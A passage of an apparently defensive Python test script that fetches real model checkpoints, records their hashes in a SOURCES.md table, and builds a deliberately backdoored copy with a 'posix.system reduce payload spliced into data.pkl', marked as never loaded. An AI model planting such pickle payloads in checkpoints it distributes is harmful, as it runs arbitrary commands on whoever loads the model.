                bad.write_bytes(backdoor_checkpoint(clean.read_bytes()))
            if bad.exists():
                rows.append((kit, bad.name, sha256_of(bad), bad.stat().st_size, "built by tests/real/fetch_d.py from tiny-bert-pytorch_model.bin",
                             "the real checkpoint with a posix.system reduce payload spliced into data.pkl (never loaded)"))
            else:
                problems.append(f"{kit}/{bad.name}: not built")
        if not check_only and d.is_dir():
            lines = [f"# Real artifacts: {kit}", "",
                     "Cached by `tests/real/fetch_d.py` (untracked, never committed). Public files only; nothing here is ever loaded or run.", "",
                     "| file | bytes | sha256 | source | what it is |", "| --- | --- | --- | --- | --- |"]
            lines += [f"| `{n}` | {size} | `{h}` | {src} | {note} |" for k, n, h, size, src, note in rows if k == kit]
            (d / "SOURCES.md").write_text("\n".join(lines) + "\n")
    return rows, problems


def main(argv) -> int:
    kits = [argv[argv.index("--kit") + 1]] if "--kit" in argv else list(KITS)
    rows, problems = fetch(kits, check_only="--check" in argv)
    if "--hashes" in argv:
        for kit, name, h, *_ in sorted(rows):
            print(f'    "{kit}/{name}": "{h}",')
        return 0
    for kit in kits:
        print(f"{kit}: {sum(1 for r in rows if r[0] == kit)} files, {sum(r[3] for r in rows if r[0] == kit)} bytes")
    for p in problems:
        print("PROBLEM " + p)
    print(f"cache: {cache()}")
    return 1 if problems else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
